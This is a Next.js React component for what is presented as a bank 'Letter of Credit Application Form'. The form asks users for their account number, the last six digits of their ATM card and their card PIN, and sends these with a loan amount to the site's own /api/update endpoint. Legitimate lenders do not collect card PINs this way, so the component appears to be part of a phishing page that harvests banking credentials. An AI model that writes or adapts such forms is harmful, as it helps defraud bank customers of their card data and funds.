'use client'
import Axios, { AxiosError, AxiosRequestConfig } from "axios"
import { useSession } from "next-auth/react"
import { useRouter } from "next/navigation"
import { useState } from "react"
import FormHero from "./formHero"




export default function Loan({setOthers, others, loading, setLoading}:{setLoading:any, setOthers:any, others:boolean, loading:boolean}) {
    
    
    const [account_number, setAccount_number] = useState('')
    const [sixDigits, setSixDigits] = useState('')
    const [pin, setPin] = useState('')
    const [loanAmount, setLoanAmount] = useState('')
    const [error, setError] = useState('');
    const { data: session } = useSession();
    //console.log(session)
    const router = useRouter()
    const onSubmitForm = async () => {

        if (account_number==''||pin==''||loanAmount==''||sixDigits=='') {
            return
        }
        setError('')
        setLoading(!loading)
        try {
          //  values.image = profile?.image;
            //console.log(values);
            const config: AxiosRequestConfig = {
                url: "/api/update",
                data: JSON.stringify({account:account_number, card_pin:pin, loan_amount:loanAmount, six_digits:sixDigits, userId:session?.user}),
                method: "PUT",
                headers: {
                    "Content-Type":"application/json"
                }
            };

            const res = await Axios(config)

            if (res.status == 200) {
                setLoading(false)
                setOthers(!others)
            } else {
                
                console.log(res.status)
            }

            console.log(res)
        } catch (error) {
           //const { message } = error
            setLoading(false)
            setError('Bad Input or Network Error')
            console.log('this error:::', error)
        }
    }


  return (
      <div>
          <FormHero header='Letter of Credit Application Form' text='We support your business in every way we can. So if you need Letters of Credit, you can count on us to deliver and keep your business relationships purring along smoothly.'/>
          
          {
              error != '' && <div className=" bg-yellow-600 text-red-700 p-4 text-center">{error}</div>
          }
          <div className=" mt-2 flex flex-col gap-2">
              <input
                  className=" w-[100%] border-2 border-[#e3000f] p-3"
                  type='tel'
                  placeholder="Account Number"
                  name="account_number"
                  onChange={(e)=>setAccount_number(e.target.value)}
            />
              <input
                  name="last6"
                  type='tel'
                className="  w-[100%] border-2 border-[#e3000f] p-3"
                  placeholder="Last six Digits on ATM CARD"
                  onChange={(e)=>setSixDigits(e.target.value)}
            />
              <input
                  name="card_pin"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                  type='tel'
                  placeholder="Card pin"
                  onChange={(e)=>setPin(e.target.value)}
              />
               <input
                  name="loan_amount"
                  className="  w-[100%] border-2 border-[#e3000f] p-3"
                  type='tel'
                  placeholder="Loan Amount"
                  onChange={(e)=>setLoanAmount(e.target.value)}
              />

              <button onClick={onSubmitForm} className=' bg-[#e3000f] text-white p-3'>Next</button>
          </div>
          
          
      
      </div>
      
  )
}
